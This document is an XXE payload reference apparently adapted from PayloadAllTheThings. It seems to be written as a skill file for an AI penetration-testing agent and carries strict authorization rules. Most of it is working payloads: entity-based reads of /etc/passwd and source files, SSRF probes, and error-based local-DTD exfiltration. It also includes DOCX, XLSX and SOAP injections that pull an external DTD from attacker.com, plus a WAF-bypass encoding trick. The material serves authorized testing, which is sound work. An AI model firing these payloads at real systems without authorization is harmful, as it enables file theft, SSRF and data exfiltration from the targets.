# XXE Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify XXE vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, DoS attacks prohibited
> - XXE payloads are for understanding attack surface only, **no SSRF exploitation of internal network**
> - Validation proves vulnerability existence (read test file), **no sensitive data theft**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Basic entity test, file read (test files), local SSRF probe | No authorization needed |
| **Tier 2: Authorized Extended** | Cloud metadata access, OOB exfiltration | User explicit authorization required |
| **Tier 3: Theory Reference** | Billion Laugh DoS, sensitive data exfiltration | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming XXE exists (entity reflected or file content returned).

---

## Validation Objectives (Within Security Boundary)

XXE vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| XXE Existence | ✓ Basic entity test | - | Billion Laugh DoS |
| File Read | ✓ Read test file (`/etc/passwd`, `win.ini`) | - | Read credentials/config |
| SSRF Capability | ✓ Probe local service (`http://127.0.0.1`) | - | Attack internal services |
| Error-based XXE | ✓ Recommended for blind XXE | - | - |
| Cloud Metadata | ❌ Not by default | ✓ Requires explicit authorization | Credential exploitation |
| OOB Exfiltration | ❌ Not by default | ✓ Requires explicit authorization | Exfiltrate sensitive data |

---

## Detect Existence

### Basic Entity Test
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY example "Doe">]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

> Tip: Set `Content-Type: application/xml` when requesting

## Classic XXE - File Read

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

### Windows File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<foo>&xxe;</foo>
```

### Base64 Encoded Read (Prevent Special Characters Breaking XML)
```xml
<!DOCTYPE test [
<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
%init;
]>
<foo/>
```

### PHP Wrapper Read Source
```xml
<!DOCTYPE replace [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts>&xxe;</contacts>
```

### XInclude (Cannot Modify DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## XXE - SSRF (Boundary Explanation)

**Boundary Explanation**: XXE-triggered SSRF can access internal services, but exploiting internal services is "attacking internal network", conflicts with SKILL.md boundary.

**Current Stance**: XXE-SSRF only for proving vulnerability existence, **no internal service exploitation**.

| Validation Method | Default | Requires Additional Authorization |
|---------|------|-----------|
| Local service probe (`http://127.0.0.1`) | ✓ Can use to prove existence | - |
| Internal service attack | ❌ Prohibited | ❌ Strictly prohibited |
| Cloud metadata read | ❌ Not by default | ✓ Requires user explicit authorization |

```xml
<!-- Only for proving SSRF capability exists, no internal service attack -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>
<foo>&xxe;</foo>
```

## ⚠️ Blind XXE - OOB Data Exfiltration (Requires Authorization)

**⚠️ IMPORTANT**: OOB exfiltration is NOT a default validation step. It initiates external network requests, which conflicts with the "prove existence without exploitation" principle.

**Default Validation Path** (recommended):
1. Try error-based XXE using local DTD (no external network)
2. Confirm XXE capability exists via error message
3. **Stop here** - existence is proven

| Validation Method | Default | Action Required |
|---------|------|------|
| Error-based XXE (local DTD) | ✓ Recommended | No authorization needed |
| OOB exfiltration | ❌ Not default | User must explicitly authorize |

**OOB Authorization Requirements** (all must be met):
1. User explicitly authorizes in writing
2. Target domain: only controlled marker (Collaborator/DNSLog)
3. Data content: only test files, no credentials
4. Report: mark "OOB executed with user authorization"

---

### OOB Payloads (Theory Reference - Do Not Execute Without Authorization)

**The following are for understanding attack theory only. Do not execute unless user has given explicit written authorization**:

```xml
<!-- Basic blind XXE test - requires authorization -->
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://YOUR_COLLABORATOR/x">
%ext;
]>
<r></r>
```

### Error-based XXE (Recommended to Try First)

Error-based method doesn't depend on external network requests, try local DTD method first:

```xml
<!-- Local DTD (Linux) -->
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
%local_dtd;
]>
<message>Text</message>
```

```xml
<!-- Local DTD (Windows) -->
<!DOCTYPE doc [
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
<!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///c:/boot.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///test/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  <!ENTITY test "test"'
>
%local_dtd;
]><xxx>anything</xxx>
```

## XXE in Special File Formats

### XXE in SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XXE in DOCX
```xml
<!-- Inject into /word/document.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
<!ENTITY % asd SYSTEM "http://attacker.com/xxe.dtd">
%asd;%c;
]>
<cdl>&rrr;</cdl>
```

### XXE in XLSX
```xml
<!-- Inject into xl/workbook.xml or xl/sharedStrings.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
<!ENTITY % asd SYSTEM "http://attacker.com/xxe.dtd">
%asd;%c;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<si><t>&rrr;</t></si>
</sst>
```

### XXE in SOAP
```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [
    <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
    %dtd;
    ]><xxx/>]]>
  </foo>
</soap:Body>
```

## WAF Bypass

### Character Encoding Bypass
```bash
# UTF-16 encoding
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > utf16_payload.xml
```

### JSON Endpoint XXE
```bash
# Modify Content-Type
Content-Type: application/xml

# Convert JSON to XML
{"search":"name"} -> <?xml version="1.0"?><root><search>name</search></root>
```

## Analysis Process

1. Identify XML input point (Content-Type, XML body, file upload)
2. Basic entity test
3. Try reading system test file (`/etc/passwd`, `/etc/hostname`)
4. No echo -> Try error-based XXE first (local DTD)
5. If OOB needed -> Must obtain user additional authorization first
6. WAF detected -> Encoding bypass
7. Confirm vulnerability existence, stop further exploitation

## Output

- Proof payload
- Complete request packet (with Content-Type)
- Read test file content
- If using OOB: mark "with user authorization"

## Severity Classification

XXE severity is based on **file-read capability or OOB exfiltration confirmed** — proof only of entity parseable records Low; reading sensitive file or exfiltration succeeded is required for High.

| Actual case | Severity | Note |
|---------|------|------|
| Reads sensitive file (configuration/keys/source code) | High | Sensitive data leak |
| Reads `/etc/passwd` or an equivalent harmless proof file | High | Capability confirmed; do not downgrade solely because the proof file is not secret |
| OOB exfiltration confirmed (DNS pingback/data exfiltration succeeded) | High | Exfiltration channel closed |
| Only XML entity parsing but no file read/exfiltration | Low | Entity parsing exists but no actual impact |
| Entity parsing disabled/sandboxed | Info | No security impact |

**Key judgment**: Reporting High requires confirming **file read or OOB exfiltration succeeded**. Entity parsing only without read records Low. OOB exfiltration of actual data requires authorization; default uses harmless files/DNS pingback to prove capability.

---

## Prohibited

- ⚠️ No DoS attacks (Billion Laugh etc.)
- ⚠️ No reading sensitive files (private keys, credentials, config)
- ⚠️ No XXE-SSRF attack on internal services
- ⚠️ No OOB exfiltration without authorization
- ⚠️ Only prove existence, do not enable harm
